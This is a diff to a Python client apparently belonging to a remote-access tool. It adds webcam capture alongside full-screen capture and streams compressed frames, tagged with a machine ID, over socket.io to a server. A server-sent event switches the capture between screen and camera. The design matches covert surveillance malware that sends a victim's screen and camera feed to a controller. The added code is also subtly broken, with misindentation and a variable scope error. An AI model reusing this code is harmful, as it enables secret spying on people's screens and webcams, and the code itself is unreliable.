@@ -14,10 +14,10 @@ import io
 import os
 import re
 import zlib
+import cv2  # Import OpenCV for camera access
 
 # Declare the global stop event
 stop_event = threading.Event()
-
 
 def run(data):
     def create_module(url):
@@ -184,24 +184,73 @@ def run(data):
             # Create and start the thread
             threading.Thread(target=run_in_thread).start()
 
-    # FUCK EVERYTHING
-    # NOTHING MATTERS BUT SCEEN
-    # SCEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEN
+    screen_or_camera = "screen"
+
+    @sio.on("switch_screen")
+    def switch_screen(data_new):
+        if data["uid"] == data_new["uid"]:
+            screen_or_camera = data["screen"]
+
+            stop_event.set()  # Signal the thread to stop
+                try:
+                    screenshot_thread.join()  # Wait for the thread to finish
+                except:
+                    "Thread is already dead"
+
     def take_screenshots(sio, uid, fps=60, quality=30):
         frame_interval = 1 / fps
         last_capture_time = 0
 
-        with mss.mss() as sct:
-            monitor = sct.monitors[0]  # Capture the entire screen
+        if screen_or_camera == "screen":
+            with mss.mss() as sct:
+                monitor = sct.monitors[0]  # Capture the entire screen
+
+                while not stop_event.is_set():
+                    current_time = time.time()
+                    if current_time - last_capture_time >= frame_interval:
+                        # Capture screenshot
+                        screenshot = sct.grab(monitor)
+
+                        # Convert screenshot to PIL Image
+                        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+
+                        # Compress to JPEG with adjustable quality
+                        with io.BytesIO() as output:
+                            img.save(output, format="JPEG", quality=quality)
+                            jpeg_data = output.getvalue()
+
+                        # Compress the JPEG data further using zlib
+                        compressed_data = zlib.compress(jpeg_data, level=9)
+
+                        # Emit the compressed data
+                        sio.emit("screenshot", {"uid": uid, "image": compressed_data})
+                        print("Sent compressed screenshot")
+
+                        last_capture_time = current_time
+
+                    # Small sleep to prevent a tight loop
+                    time.sleep(0.001)
+        else:
+            # Use OpenCV to capture from the camera instead of the screen
+            cap = cv2.VideoCapture(0)  # 0 is the default camera device index
+
+            if not cap.isOpened():
+                print("Error: Could not open camera.")
+                return
 
             while not stop_event.is_set():
                 current_time = time.time()
                 if current_time - last_capture_time >= frame_interval:
-                    # Capture screenshot
-                    screenshot = sct.grab(monitor)
+                    ret, frame = cap.read()
+                    if not ret:
+                        print("Failed to capture image from camera")
+                        break
 
-                    # Convert screenshot to PIL Image
-                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                    # Convert the frame (BGR) to RGB
+                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+
+                    # Convert the frame to a PIL Image
+                    img = Image.fromarray(frame_rgb)
 
                     # Compress to JPEG with adjustable quality
                     with io.BytesIO() as output:
@@ -213,12 +262,14 @@ def run(data):
 
                     # Emit the compressed data
                     sio.emit("screenshot", {"uid": uid, "image": compressed_data})
-                    print("Sent compressed screenshot")
+                    print("Sent compressed camera screenshot")
 
                     last_capture_time = current_time
 
-                # Small sleep to prevent a tight loop
-                time.sleep(0.001)
+                    # Small sleep to prevent a tight loop
+                    time.sleep(0.001)
+
+            cap.release()
 
     screenshot_thread = threading.Thread(
         target=take_screenshots, args=(sio, data["uid"])
